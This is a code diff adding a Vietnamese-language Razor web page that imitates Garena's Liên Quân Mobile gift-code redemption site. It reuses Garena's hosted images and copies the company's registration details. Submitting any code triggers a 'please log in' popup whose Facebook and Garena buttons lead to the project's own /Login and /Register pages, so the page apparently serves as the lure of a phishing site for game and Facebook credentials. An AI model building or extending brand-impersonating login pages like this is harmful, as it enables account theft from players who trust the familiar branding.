@@ -1,0 +1,154 @@
+﻿@page
+@model GarenaFrondEnd.Pages.IndexModel
+@{
+    Layout = "_LayoutEmpty";
+    ViewData["Title"] = "Nơi đổi quà của LQM";
+}
+
+<style>
+    body {
+        background: url("https://lienquan.garena.vn/giftcode/pr.png") no-repeat center center fixed;
+        background-size: cover; /* giữ ảnh full màn hình */
+        background-color: #000;
+        color: #fff;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        text-align: center;
+    }
+
+    .giftcode-container {
+        margin-top: 10px; /* tuỳ chỉnh cao thấp */
+    }
+
+    .giftcode-box {
+        background: none;
+        padding: 20px;
+        border-radius: 0px;
+        text-align: center; /* căn giữa */
+    }
+
+    .form-control {
+        width: 400px;
+        padding: 12px;
+        font-size: 14px;
+        border-radius: 0px;
+        border: 1px solid #ccc;
+        text-align: center;
+        margin: 0 auto 20px auto; /* chỉ cách nút 20px thôi */
+        outline: none;
+        display: block; /* để margin auto có tác dụng */
+    }
+
+        .form-control:focus {
+            border-color: #ffd966;
+            box-shadow: 0 0 8px rgba(255, 217, 102, 0.8);
+        }
+
+    .btn-confirm {
+        display: flex;
+        padding: 9px;
+        justify-content: center;
+        align-items: center;
+        width: 250px;
+        height: 60px;
+        background: url("https://giftcode.lienquan.garena.vn/images/btn01.png") no-repeat center center;
+        background-size: cover;
+        border: none;
+        cursor: pointer;
+        color: #fff;
+        font-size: 18px;
+        font-weight: bold;
+        margin: 0 auto; /* căn giữa nút */
+    }
+
+
+        .btn-confirm:hover {
+            opacity: 0.9;
+            transform: scale(1.05);
+            transition: 0.2s;
+        }
+
+
+    .noted {
+        margin-top: 15px;
+        font-size: 13px;
+        color: #ccc;
+    }
+
+    .address {
+        font-size: 12px;
+        color: #ccc;
+        margin: 20px auto;
+        width: 70%;
+        line-height: 1.6;
+    }
+</style>
+
+
+<div class="giftcode-container">
+    <div class="giftcode-box">
+        <!-- Form có id để bắt sự kiện -->
+        <form id="giftForm">
+            <div class="form-group">
+                <input type="text" class="form-control" placeholder="Vui lòng nhập code" />
+            </div>
+            <button type="submit" class="btn-confirm"></button>
+        </form>
+    </div>
+
+    <div class="noted">
+        <p>Khi số lượng người cùng quy đổi quá nhiều, bạn có thể gặp lỗi "Hệ thống đang bận". Vui lòng chờ một chút rồi thử lại nhé!</p>
+    </div>
+
+    <p>
+        <img src="https://lienquan.garena.vn/asset/images/logo-footer.png" alt="Garena Footer Logo" />
+    </p>
+
+    <p class="address">
+        CÔNG TY CỔ PHẦN GIẢI TRÍ VÀ THỂ THAO ĐIỆN TỬ VIỆT NAM<br>
+        Giấy CNĐKKD số 0105301438, cấp lần đầu ngày 10/05/2011<br>
+        Cơ quan cấp: Phòng Đăng ký kinh doanh–Sở Kế hoạch và đầu tư TP Hà Nội<br>
+        Địa chỉ trụ sở chính: Tầng 29, Trung tâm Lotte Hà Nội, số 54, Liễu Giai, P. Cống Vị,<br>
+        Q. Ba Đình, TP Hà Nội, Việt Nam.<br>
+        Điện thoại: 024 73053939
+    </p>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+    document.getElementById("giftForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        Swal.fire({
+            icon: 'info',
+            title: 'Thông báo',
+            html: `
+                <p>Vui lòng đăng nhập</p>
+                <div style="margin: 8px 0;">
+                    <button id="btnLogin" style="border:none; background:none; cursor:pointer; margin:0 6px;">
+                        <img src="https://giftcode.lienquan.garena.vn/images/icon-fb.png" alt="Login" width="40"/>
+                    </button>
+                    <button id="btnRegister" style="border:none; background:none; cursor:pointer; margin:0 6px;">
+                        <img src="https://giftcode.lienquan.garena.vn/images/icon-gr.png" alt="Register" width="40"/>
+                    </button>
+                </div>
+            `,
+            confirmButtonText: 'OK',
+            allowOutsideClick: false,
+            didOpen: () => {
+                document.getElementById('btnLogin').addEventListener('click', () => {
+                    window.location.href = "/Login";
+                });
+                document.getElementById('btnRegister').addEventListener('click', () => {
+                    window.location.href = "/Register";
+                });
+            }
+        });
+    });
+</script>
